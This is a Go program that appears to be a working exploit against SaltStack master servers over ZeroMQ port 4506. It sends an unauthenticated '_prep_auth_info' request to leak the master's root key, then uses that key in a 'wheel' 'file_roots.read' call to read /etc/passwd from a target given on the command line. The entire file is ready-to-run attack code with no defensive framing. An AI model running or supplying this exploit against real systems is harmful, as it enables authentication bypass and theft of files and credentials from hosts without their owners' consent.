package main

import (
	"context"
	"flag"
	"fmt"
	"time"

	"github.com/fanjq99/common/log"
	"github.com/go-zeromq/zmq4"
	"github.com/vmihailenco/msgpack/v4"
)


type SaltLoad struct {
	Enc  string            `msgpack:"enc"`
	Load map[string]string `msgpack:"load"`
}

func genSaltMsg(cmd map[string]string, crypt string) ([]byte, error) {
	l := &SaltLoad{
		Enc:  crypt,
		Load: cmd,
	}

	b, err := msgpack.Marshal(l)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return b, nil
}

func getReqChannel(host string, port int, timeout int64) (zmq4.Socket, error) {
	ctx, _ := context.WithTimeout(context.Background(), time.Duration(timeout)*time.Second)
	req := zmq4.NewReq(ctx)
	err := req.Dial(fmt.Sprintf("tcp://%s:%d", host, port))
	if err != nil {
		log.Error("could not dial: %v", err)
		return nil, err
	}
	return req, nil
}

func getSaltRootKey(client zmq4.Socket) string {
	var err error
	msg, _ := genSaltMsg(map[string]string{"cmd": "_prep_auth_info"}, "clear")
	for i := 0; i < 3; i++ {
		err = client.Send(zmq4.NewMsg(msg))
		if err != nil {
			log.Error(err)
			time.Sleep(1 * time.Second)
			continue
		}

		resp, err := client.Recv()
		if err != nil {
			continue
		}

		if len(resp.Frames) > 0 {
			var res []interface{}
			err = msgpack.Unmarshal([]byte(resp.Frames[0]), &res)
			if err == nil {
				for _, v := range res {
					vv, ok := v.(map[string]interface{})
					if ok {
						authKey := vv["root"].(string)
						if authKey != "" {
							return authKey
						}
					}
				}
			}
		}

		time.Sleep(1 * time.Second)
	}

	return ""
}

func readFile(client zmq4.Socket,rootKey string)  {
	var err error
	msg := map[string]string{
		"key":     rootKey,
		"cmd":     "wheel",
		"fun":     "file_roots.read",
		"path":    "/etc/passwd",
		"saltenv": "base",
	}
	body, _ := genSaltMsg(msg, "clear")
	for i := 0; i < 3; i++ {
		err = client.Send(zmq4.NewMsg(body))
		if err != nil {
			log.Error(err)
			time.Sleep(1 * time.Second)
			continue
		}

		resp, err := client.Recv()
		if err != nil {
			log.Error(err)
			continue
		}

		if len(resp.Frames) > 0 {
			log.Info("/etc/passwd", string(resp.Frames[0]))
			break
		}

		time.Sleep(1 * time.Second)
	}
}

var (
	host = flag.String("host", "", "target host")
	port = flag.Int("port",4506,"target port")
)


func main()  {
	flag.Parse()

	if *host == "" {
		log.Error("input host first")
		return
	}

	client,err := getReqChannel(*host, *port, 20)
	if err != nil {
		log.Error("connect error", err)
		return
	}

	defer client.Close()

	rootKey := getSaltRootKey(client)
	if rootKey == "" {
		log.Error("not found rootkey", rootKey)
		return
	}

	readFile(client,rootKey)
}
